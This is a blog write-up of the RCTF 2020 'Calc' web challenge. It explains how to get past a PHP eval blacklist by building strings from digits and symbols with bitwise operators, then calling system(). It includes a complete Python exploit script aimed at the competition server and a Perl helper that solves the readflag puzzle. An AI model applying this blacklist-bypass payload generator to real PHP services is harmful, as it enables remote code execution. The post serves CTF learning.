---
layout: post
title:  "Calc - a WAF bypass for arbitrary code execution in PHP using just numbers and symbols (RCTF 2020)"
date:   2020-06-10 07:55:19 -0400
categories: web rctf2020 php
---

## Introduction

Here's an interesting problem I solved from the recent RCTF. We are given a web form that allows us to input values and operations to a calculator and the results will be printed. For example, the query `1+1` would give us `2`. _(I didn't take a screenshot of the normal operation when the competition server was still up, so you would have to use your own imagination)_. It's highly likely that the backend is doing some sort of `eval` to perform this arithmetic operation, so we investigate further.


## Enumeration
We see that the endpoint of the POST request containing the arithmetic operation is to `/calc.php`, so we make a GET request, which recovers the the source code below:

{% highlight php %}
<?php 
error_reporting(0); 
if(!isset($_GET['num'])){ 
    show_source(__FILE__); 
}else{ 
    $str = $_GET['num']; 
    $blacklist = ['[a-z]', '[\x7f-\xff]', '\s',"'", '"', '`', '\[', '\]','\$', '_', '\\\\','\^', ',']; 
    foreach ($blacklist as $blackitem) { 
        if (preg_match('/' . $blackitem . '/im', $str)) { 
            die("what are you want to do?"); 
        } 
    } 
    @eval('echo '.$str.';'); 
} 
?> 
{% endhighlight %}

We see that our parameter `num` is assigned to `$str` and passed into `eval`. This means we can have remote code execution if we bypass the blacklist! 

#### A small aside: How to know if it's PHP

Of course, we were given full source code recovery for this challenge (I actually didn't know about this until a teammate told me about it after I completed the challenge). From the execution of the code there are some heuristics that we can use to determine the backend for the code evaluation:

1. **Response Headers.** The headers returned in the response might indicate the backend used to evaluate your request. For example, in the challenge, the response had a `X-Powered-By` header with the value `PHP/7.4.6`.
2. **Rendering of special floats.** In PHP, evaluation `1/0` gives you `INF` and `0/0` gives you `NAN` without throwing an exception (but it does show a warning), which I believe is unique to PHP.


## Blacklist/WAF bypass - Using just numbers and symbols for ACE

Now comes the interesting part of the challenge. As a lazy hacker I went to look for existing WAF bypasses in PHP and came across [this article on bypassing WAF without numbers and letters](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/). While this may seem at first to work, the subset of symbols that we are allowed is much more restricted. For example, we do not have the `$` operator so we can't define new variables, nor can we define arrays (since `[` and `]` are blocked) or strings (since `'` and `"` are blocked). However, the article does elucidate an interesting fact: *if we can construct arbitrary strings, we are done*.

### Fun function calls via variable functions
But you might be wondering, how do we call functions using just a string? I am glad you asked. I didn't believe it at first, but you can simply call functions in PHP just by their stringified identifier. You can try this yourself by running the following code snippet.

{% highlight php %}

<?php

function foo() {
    echo "In foo()<br />\n";
}

'foo'();

{% endhighlight %}

The output that is returned is `In foo()<br />`, which means the function `foo` was called. This is due to a feature in PHP known as [**variable functions**](https://www.php.net/manual/en/functions.variable-functions.php). From the PHP docs:

>  if a variable name has parentheses appended to it, PHP will look for a function with the same name as whatever the variable evaluates to, and will attempt to execute it ... this can be used to implement callbacks, function tables, and so forth.

Note that this function calling convention, like normal PHP functions, is ___case insensitive___, but we won't be using that fact here.

However, there is a caveat:

> Variable functions won't work with language constructs such as echo, print, unset(), isset(), empty(), include, require and the like

A list of language constructs can be found [here](https://www.php.net/manual/en/reserved.keywords.php). A quick glance through the list and we find that our desired function to call (`system`) is not on the list. This means we are good to go!


### Constructing characters

What's left is actually constructing the characters. The blacklist essentially gives us numeric inputs and a limited subset of symbols.

#### Baby's First String
I quickly managed to find a way of constructing a string using the following payload:

{% highlight php %}
(0).(0) // evaluates to '00'
{% endhighlight %}


This is allowed because PHP is loosely typed and the [string concatenation operator](https://www.php.net/manual/en/language.operators.string.php) `.` coerces the type of the operands to be strings, so the result is the string `00`. Note that if the parentheses were removed, we would get `0.0` which is a float.


Speaking of floats, I decided to try something interesting. Recall that we previously tried to use special numbers in floats to identify the backend. In this case, we can concatenate two of these special floats together to form a cute string.

{% highlight php %}
(1/0).(1/0) // evaluates to "INFINF"
(0/0).(0/0) // evaluates to "NANNAN" (batman)
{% endhighlight %}


So we technically have the strings `"NAN", "INF", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"`, but any combination of these strings won't give us shell _(yet)_, we have to dig deeper!

#### Looking for more primitives
I got stuck here for quite a bit and decided to look for all possible operators in PHP. I did browse around and managed to find that `->`, `=>`, `{`, `}` and `::` are legal operators through extensive web searching (thanks Google!). While writing this article I found a more [extensive list of tokens that are used in PHP](https://www.php.net/manual/en/tokens.php) which would have been a much better resource.

I toyed around with the idea of using `->` (which is the `T_OBJECT_SEPARATOR` used to assign and retrieve values from an object), `=>` (which is the `T_DOUBLE_ARROW` used to assign values in an array), and `::` (which is a [scope resolution operator](https://www.php.net/manual/en/language.oop5.paamayim-nekudotayim.php) which has a pretty interesting history behind its name) before realizing they won't work.

Finally, we are left with `{` and `}`. These symbols are actually pretty interesting - a quick tl;dr of what happened was that they were introduced to replace `[` and `]` as array accesses, but later realized it was a bad idea, so they deprecated it and tried to revert the change but then realized that was a bad idea too. Now, [it can be used interchangeably](https://www.php.net/manual/en/language.types.array.php) and [works for string array index access as well](https://www.php.net/manual/en/language.types.string.php), though it does warn that it would be deprecated in newer versions of PHP. That aside, we now have the following string index access primitive:

{% highlight php %}
(1/0).(1/0) // evaluates to "INFINF"
((1/0).(1/0)){0} // evaluates to "I"
{% endhighlight %}

So we now have the strings `"N", "A", "I", "F", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"`. We can also add additional characters like `"."` from coercing floats to strings and `"-"` by coercing negative numbers, but we still don't have the right letters to construct calls to functions that we want, and we still can't construct arbitrary characters. If only we had some way of changing these characters...

#### Quick Math with Strings

I continued to play around to see how to change the characters (either by incrementing them or decrementing them like via `++`) but without variable declarations this was impossible. I later came across a [Web CTF resource](https://github.com/w181496/Web-CTF-Cheatsheet) that hinted to look at the `~` operator, which is the bitwise not operator. I tried it and lo and behold:

{% highlight php %}
(((0/0).(1)){0}).(~((1).(1/0))) // evaluates to Nζ��
{% endhighlight %}

Finally we are getting somewhere! We see that we have constructed some other character that is not in our original list of characters. It seems that [bitwise operations](https://www.php.net/manual/en/language.operators.bitwise.php) like `|`, `&`, `^` and `~` are also defined for strings in PHP. Note that we can't use `^` since it's banned, and `>>` and `<<` coerces the type of the operands to be integers. We can now construct printable ASCII, as below.

{% highlight php %}
(((1/0).(1/0)){0})|((1).(1)){0} // evaluates to 'y'
{% endhighlight %}

With these bitwise operators, we can easily construct any 7-bit ASCII character if we get the equivalent representation of `chr(1)`, `chr(2)`, `chr(4)`, `chr(8)`, `chr(16)`, `chr(32)` and `chr(64)`. We do some quick math (aka figuring out how to extract each of these bits from the characters we already have) and we have the following mapping for each of these bits.

{% highlight python %}
mapping = {
    64: "(((1/0).(1)){0})&(((1/0).(1)){2})",
    32: "((0).(0){0})&(((1.5).(0)){1})",
    16: "(~(((1.5).(0)){1}&(((0).(0)){0})))&(0).(0){0}",
    8: "(8).(8){0}&((1/0).(0)){0}",
    4: "(4).(4){0}&((1/0).(0)){2}",
    2: "(2).(2){0}&((1/0).(0)){1}",
    1: "(1).(1){0}&((0/0).(0)){1}"
}
{% endhighlight %}

For example, the ASCII letter `a` which corresponds to the ordinal `97` or `0b1100001` can be constructed as follows:

{% highlight php %}
(1).(1){0}&((0/0).(0)){1} | ((0).(0){0})&(((1.5).(0)){1}) | (((1/0).(1)){0})&(((1/0).(1)){2})  // evaluates to chr(64 | 32 | 1) == 'a'
{% endhighlight %}

Now we can form arbitrary strings from arbitrary characters via the `.` string concatenation operator. Combining with the variable functions trick as above, we can call the equivalent of `'system'('uname -a')` to see if we can run arbitrary shell commands. We send it to the server we see that we have achieved arbitrary code execution!

![Shell get! Output of uname -a](/images/rctf2020-shell.png "Shell get!")

Enumerating the environment, we find a `/readflag` binary. We execute it, and we realize that this isn't the end!

![Readflag sadness](/images/rctf2020-puzzle.png "Readflag sadness")

### Breaking The readflag Puzzle

I didn't really like the next part of the challenge so much, as you will see why. Using the same script, I exfiltrated the readflag binary out and analyzed it. Long story short, it throws you a math challenge that you have to solve in 1ms. This means that you are supposed to get shell on the system to run a script that solves the problem, but a reverse shell wasn't possible due to network isolation. 

I looked up this online (since CTFs in the east tend to be inspired by previously released challenges) and [found the exact same readflag binary and with solve scripts in various languages described](https://www.secpulse.com/archives/105333.html). TL;DR my solution was to write one of the solve scripts to `/tmp` and execute it to get the flag. 

In writing the script to a file, I had to break it up into short chunks per line since the encoding for each byte was fairly large. It is worth noting that other teams found interesting ways of bypassing the URL parameter length limit (which I found to be around 8000-ish bytes), and the [ROIS team's writeup](https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/#Calc) details interesting alternative solutions to this problem.

Balsn also has a bunch of tricks that they use to solve the `readflag` binary, as noted [here](https://balsn.tw/ctf_writeup/20190427-*ctf/#solve_readflag-(not-a-challenge)).

## Final Script

The final solve scripts are provided below.

### solve.py
{% highlight python %}
#!/usr/bin/env python

import requests
import sys
import pipes

url='http://124.156.140.90:8081/calc.php?'

mapping = {
    64: "(((1/0).(1)){0})&(((1/0).(1)){2})",
    48: '(0).(0){0}',
    32: "((0).(0){0})&(((1.5).(0)){1})",
    16: "(~(((1.5).(0)){1}&(((0).(0)){0})))&(0).(0){0}",
    8: "(8).(8){0}&((1/0).(0)){0}",
    4: "(4).(4){0}&((1/0).(0)){2}",
    2: "(2).(2){0}&((1/0).(0)){1}",
    1: "(1).(1){0}&((0/0).(0)){1}"
}

idxs = [64, 48, 32, 16, 8, 4, 2, 1]

def construct_char(c):
    val = ord(c)

    payload = "("
    for idx in idxs:
        if (val >= idx):
            val -= idx
            payload += mapping[idx]
            if (val != 0):
                payload +='|'

    assert val == 0
    payload += ")"

    return payload

def construct_string(s):
    payload = "("
    for i, c in enumerate(s):
        payload += construct_char(c)
        if (i != len(s) - 1):
            payload += "."

    payload += ")"
    return payload

def call_fn(f, a):
    fn_s = construct_string(f)
    fn_a = construct_string(a)
    return fn_s + "(" + fn_a + ")"

### Actually solve for flag
# write the evil file to solves the puzzle
f = open('solve.perl', 'rt')
solver = f.read().split('\n')
f.close()

for s in solver:
    d = call_fn("system", """echo %s>>/tmp/b""" % pipes.quote(s))
    params = {'num': d }
    r = requests.get(url, params=params)
    print r.text

d = call_fn("system", """cat /tmp/b""")
params = {'num': d }
r = requests.get(url, params=params)
print r.text

d = call_fn("system", """perl /tmp/b""")
params = {'num': d }
r = requests.get(url, params=params)
print r.text

d = call_fn("system", "rm /tmp/b")
params = {'num': d }
r = requests.get(url, params=params)

### Uncomment to run arbitrary commands
#FUNCTION = "system"
#ARG = sys.argv[1]

#d = call_fn(FUNCTION, ARG)
#print len(d)
#print d

#params = {'num': d }
#r = requests.get(url, params=params)
#print r.text

{% endhighlight %}

### solve.perl
{% highlight perl %}
use 
IPC::Open3;
my $pid = 
open3( 
\*CHLD_IN, 
\*CHLD_OUT, 
\*CHLD_ERR, 
"/readflag"  
);
my $r;
$r=
<CHLD_OUT>;
print "$r";
$r=
<CHLD_OUT>;
print "$r";
$r=eval 
"$r";
print 
"$r\\n";
print 
CHLD_IN 
"$r\\n";
$r=
<CHLD_OUT>;
print "$r";
$r=
<CHLD_OUT>;
print "$r";
{% endhighlight %}


Relevant Resources:

- [Bypassing WAF for PHP webshell without letters or numbers](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)
- [w181496's Web CTF Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
- [ROIS's Writeup for Calc at RCTF2020 which explores alternative ways of loading the shell command to bypass the URL param size limit](https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/#Calc)
- [EasyCalc at RoarCTF-2019, the precursor to this challenge](https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/easy_calc/writeup)
- [PHP Query String Parser Bypass](https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/)

Hack on!